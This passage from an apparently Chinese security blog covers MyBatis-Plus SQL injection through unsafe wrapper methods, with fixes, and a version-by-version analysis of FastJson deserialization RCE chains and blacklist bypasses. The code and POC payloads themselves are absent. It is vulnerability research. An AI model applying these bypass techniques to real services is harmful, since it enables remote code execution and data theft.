Mybatis不同，Mybatis-plus省去了 Mybatis所必需的映射器xml文件。 为了加深印象，我自己搭了一个使用 SpringBoot + Mybatis-plus的环境，添加依赖和数据库配置文件不多赘述。 Application.propertirs： 创建实体类 - 可以类比为 Mybatis中的 resultType： mapper层，继承 BaseMapper，BaseMapper中定义好了很多现成的 sql查询语句，供开发可以直接使用： service层：eq -&gt; equal的意思，即 where username &#x3D; username(用户输入) Controller层： 启动项目，即可连接数据库，进行查询操作： BaseMapper中提供的查询方法都使用了预编译来避免 sql注入。 (1) apply()直接拼接导致 sql注入 打印日志如图所示： 如上代码使用 apply()方法会将 username直接拼接到 sql查询语句中，不进行任何预处理，导致 sql注入。 修复方法很简单，apply()也有预编译： 使用 {0} 充当占位符，这样写可以达到预编译的效果，如下图打印日志所示： (2) last()使用不当在 MyBatis-Plus 中，last() 方法用于在 SQL 语句的末尾拼接自定义的 SQL 片段。这对于在查询中添加一些特定的 SQL 语句非常有用，比如排序、分页或其他一些自定义条件。 直接将 username拼接到 sql语句中，再去执行，造成 sql注入。 修复建议： 对用户的输入数据进行规范处理，采用过滤等操作，并且应尽量避免使用 last()。 (3) exists()和 notExists()使用不当：EXISTS 和 NOT EXISTS 常常用于查询中，需要根据某个条件是否存在来过滤数据。一般情况下，这类子查询会嵌套在 WHERE 子句中，判断某个数据是否满足特定条件。 业务场景： 比如有两个表 user 和 order，order 表中的每个订单都与 user 表中的某个用户相关联。如果你想查询那些有订单的用户，可以使用 EXISTS 子查询： 最终的查询语句为： 这个查询会返回那些有至少一个订单的用户。 notExists()同理。 但是如果直接拼接用户可控的输入就会造成 sql注入： 修复可以继续采用 {index}的方式： (4) having()使用不当having() 主要用于对分组后的数据进行条件过滤。在一些需要对聚合结果进行筛选的场景下，having() 非常有用。例如，计算销售总额、订单数量等指标，并对这些指标进行过滤。 比如：查询订单数量大于 10 的用户： 假设我们有一个 orders 表，包含 user_id 和 order_id 等字段。如果我们想查询订单数量大于 10 的用户，可以使用 having() 方法： 这个查询会生成如下 SQL： 但是如果直接拼接用户输入就会造成 sql注入： 类似的写法还有：只不过上面那个是字符型注入，下面这个是数字型注入罢了。 依然是 {idnex}即可避免注入： (5) order by注入orderBy(true, true, id) - 升序 orderBy(true, false, id) - 降序 orderByAsc() - 升序 orderByDesc() - 降序 order by注入与前面几种不同的是，order by不可以进行预编译，因为会强加上单引号，所以不能使用 {index}来进行修复了。 如果 order by 之后的数据用户可控，就存在 sql注入的风险。 时间盲注： (6) inSql()和 notInSql()使用不当：insql() 方法用于在 WHERE 子句中添加一个 IN 子查询条件。IN 子句会检查字段的值是否存在于由子查询返回的结果集中。 假设我们有一个 orders 表，想查询所有 user_id 在某些 order_id 查询结果中的用户。可以使用 inSql() 方法来构造这个查询： 生成的 SQL查询语句如下： 总结了一下，Mybatis-plus出现的 sql注入本质上仍然是未进行预编译的直接拼接导致的。还有一些文章将 wrapper自定义 sql语句导致注入 和 使用xml文件进行映射产生的注入单独拿出来说，我认为最终还是会归咎到上面几种注入中，所以不过多赘述了。"},{"title":"FastJson反序列化RCE分析","date":"2025-01-12T01:36:09.675Z","url":"/2025/01/12/FastJson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/","tags":[["FastJson","/tags/FastJson/"]],"categories":[["FastJson","/categories/FastJson/"]],"content":"前言影响版本：fastjson &lt;= 1.2.24描述：fastjson 默认使用 @type 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter&#x2F;setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。 fastjson &lt;&#x3D; 1.2.24 存在两条利用链： (1) jdbcRowSetImpl - JNDI注入 (2) TemplatesImpl fastjson 反序列化时的一些规则这里列举一些 fastjson 反序列化时对函数方法名和参数的一些要求： 使用 JSON.parse(jsonString) 和 JSON.parseObject(jsonString, Target.class)，两者调用链一致，前者会在 jsonString 中解析字符串获取 @type 指定的类，后者则会直接使用参数中的 class。 fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter&#x2F;setter 方法， 其中 getter 方法需满足条件： 方法名长于 4 不是静态方法 以 get 开头且第 4 位是大写字母 方法不能有参数传入 继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong 此属性没有 setter 方法； setter 方法需满足条件： 方法名长于 4 以 set 开头且第 4 位是大写字母 非静态方法 返回类型为 void 或当前类 参数个数为 1 个。具体逻辑在 com.alibaba.fastjson.util.JavaBeanInfo.build() 中。 FastJson &lt;&#x3D; 1.2.24jdbcRowSetImpl链位置：com.sun.rowset.JdbcRowSetImpl#setAutoCommit 跟进 this.connect()方法： this.connect()方法中使用了 lookup()方法: dataSourceName值可控，存在JNDI注入： POC 利用场景： 其中 user输入用户可控。 TemplatesImpl链(条件苛刻)TemplatesImpl 起源 getter方法 getOutputProperties()，跟进 newTransformer()： 继续跟进 getTransletInstance()： 可以看到当 _class 的值为 null时会调用 defineTransletClasses()，跟进 defineTransletClasses()： 1、想进入 try{}代码模块。_bytecodes字节码数组不可以为 null。 2、加载的类的父类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，_transletIndex默认值为 -1，若加载类父类不是 AbstractTranslet，就会报错。 符合条件的类加载完成后，在 getTransletInstance()中进行实例化，实例化时会执行 静态初始化块的代码，从而RCE。 POC(参考 Y4er师傅) 1.2.25 &lt;&#x3D; FastJson &lt;&#x3D; 1.2.41使用 jdbc链时报错：autoType is not support. com.sun.rowset.jdbcRowSetImpl FastJson 在 1.2.25 ~ 1.2.41 版本中增加了 checkAutoType()，在获取 @type的值时对其进行检测： 跟进 com.alibaba.fastjson.parser.ParserConfig#checkAutoType autoTypeSupport 值默认为 false，使用黑白名单进行验证，若将 autoTypeSupport机制开启，即 autoTypeSupport &#x3D; true，即可无需白名单检测通过，也可以加载类： 但依然要绕过黑名单检测： 可以使用 loadClass()的特殊字符去除机制进行绕过(逻辑漏洞)： 类名开头为[会在类加载时去除，以 L开头;结尾也会在类加载时去除。 POC1、首先显示的开启 autoTypeSupport机制： ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 2、特殊字符绕过黑名单检测： 注：黑名单绕过是基于ParserConfig.getGlobalInstance().setAutoTypeSupport(true);的基础之上的。 FastJson 1.2.421.2.42 版本中的黑名单采用了 hash值的形式。 并且对传入的类进行了特殊字符处理，对开头的 L 和结尾的 ; 进行了一次去除，并重新将删除后的结果赋值className。但 loadClass()进行的是递归处理，所以可以双写绕过： POC FastJson 1.2.43修复双写绕过，若出现两个 L字符开头则直接抛出异常： 但是 [ 可以正常使用，使用 [绕过即可。 POC FastJson 1.2.44修复了 1.2.43中 [字符绕过的问题。 FastJson 1.2.45黑名单绕过。 POC FastJson 1.2.47 (重要)POC FastJson 1.2.47 是最为严重的一个漏洞。可以在不开启 autoTypeSupport的条件下实现RCE。 com.alibaba.fastjson.util.TypeUtils的静态代码块初始化调用 com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings 将常用的类通过 loadClass()放到 mappings中： 使用 POC进行调试： 继续跟进到 checkAutoType()中，代码使用 Mapping 和使用 deserializers.findClass() 查找 Java.lang.Class： 找到后赋值给 clazz： clazz有值后，直接返回了，无需经过黑白名单检测： 从 checkAutoType()出来后，跟进 deserialize()： Parser.parse()获取到 objVal的值： 进而赋值给 strVal: 经过一系列 if判断，因为 clazz 为 java.lang.Class &#x3D;&#x3D; Class.class，所以 strVal作为参数被 TypeUtils.loadClass()调用，跟进 TypeUtils.loadClass()： 继续跟进 loadClass()，可以看到 cache参数默认为 true： 将 com.sun.rowset.JdbcRowSetImpl类加入到了 mapping中。这样在解析第二组键值对时，可以在 mapping中找到 JdbcRowSetImpl类从而直接 return class，无需黑白名单检测，实现RCE。 FastJson 1.2.48针对 1.2.47进行了修复，将 cache的默认值从 true修改为了 false： FastJson 1.2.62前提：autoTypeSupport 为 true POC FastJson 1.2.66前提：autoTypeSupport 为 true POC FastJson 1.2.68FastJson 1.2.68版本引入了安全模式 safeMode，如果开启了安全模式，直接抛出异常，一劳永逸： 这个版本有两个RCE： ThrowableDeserializer.deserialze() 和 JavaBeanDeserializer.deserialze() 但是 ThrowableDeserializer.deserialze() 很鸡肋，因为很少有开发往异常类中去写命令执行。 POC1 (Throwable) 调试 获取 Java.lang.Exception的反序列化器时，跟进 getDeserializer()方法： 因为 Throwable是 Exception类的父类，故使用 ThrowableDeserializer来获取反序列化器，而不是使用 createJavaBeanDeserializer()： 继续跟进 deserializer.deserialze()： 可以看到此时 checkAutoType()中的 exClassName值为 Throwable.class，跟进 checkAutoType()： 符合 expectClass.isAssignableFrom(clazz)的条件，return clazz，通过 checkAutoType检测，后续通过调用 getter，setter方法引发RCE。 POC2 (AutoCloseable) 过程同理，不过多赘述。 FastJson 1.2.80回顾 FastJson 1.2.68版本的漏洞，利用 ThrowableDeserializer和 JavaBeanDeserializer在调用 checkAutoType时第二个参数 exceptClass期望类不为空实现RCE，但是哪个开发往异常类里写命令执行函数呢，所以这个版本漏洞的攻击面很小，所以官网并未对这个绕过进行修复，而是把几个可能被利用的类加入了黑名单，为 FastJson 1.2.80版本的RCE埋下伏笔。 参考 Y4er师傅的代码，构造一个 Json解释原理： Json_poc: 打断点调试，同 FastJson_1.2.68，使用反序列化器 ThrowableDeserializer，跟进 ThrowableDeserializer.deserialze()： 依旧同 FastJson_1.2.68，获取第二个 @type中的值 com.xxxx.fastjson_demo.run.MyException，并创建它的异常实例： 继续跟进，若还有剩余键值对未进行反序列化 (这里剩余 “clazz”:{})，会继续获取 exClass的反序列化器： 继续跟进，如果 value不是 fieldInfo.fieldClass类型则会进入 TypeUtils.cast()中，这里 fieldInfo.fieldClass 是 com.xxxx.fastjson_demo.run.MyException，value &#x3D; {}显然类型不同，跟进 TypeUtils.cast()： 继续跟进： 经过一系列判断，因为 obj &#x3D; value &#x3D; {}，{}表示空的 JSON对象，{} instancef Map是正确的，继续跟进 castToJavaBean()： 跟进 getDeserializer()方法： 继续跟进： 最后调用 putDeserializer()方法，将 com.xxxx.fastjson_demo.run.MyClass类加入到 deserializer名单中 这样就可以在反序列化 Json中的 “b”的内容时，通过 checkAutoType检测，实现RCE。 POC(1) Groovy: (参考 ) 修复：直接干掉了异常类 参考文章：(1)  (2)  (3)  (4)  (5) "},{"title":"FastJson漏洞POC的构造逻辑","date":"2025-01-11T13:12:50.815Z","url":"/2025/01/11/FastJson%E6%BC%8F%E6%B4%9E%20POC%E7%9A%84%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91/","tags":[["FastJson","/tags/FastJson/"]],"categories":[["FastJson","/categories/FastJson/"]],"content":"FastJson的调用逻辑 (根据代码执行结果分析)Fastjson漏洞产生在将 JSON字符串 反序列化为 JavaBean的过程中。 这是一段使用 parseObject()方法将 JSON字符串反序列化的代码： User类： JSONUser类： 可以看到 JSON字符串中的 “studentName” : “admin”，而不是 “name” : “admin”，是因为要向 setStudentName看齐： “studentName” 运行结果 -&gt; setStudentName()方法被调用 “name” 运行结果 -&gt; setStudentName()方法未被调用 这个例子也就解释了为什么 Fastjson 1.2.24 - JdbcRowSetImpl链 POC中 需要给 autoCommit参数单独赋值(true和 false都行)，原因就是不赋值调用不了 setAutoCommit方法。"}]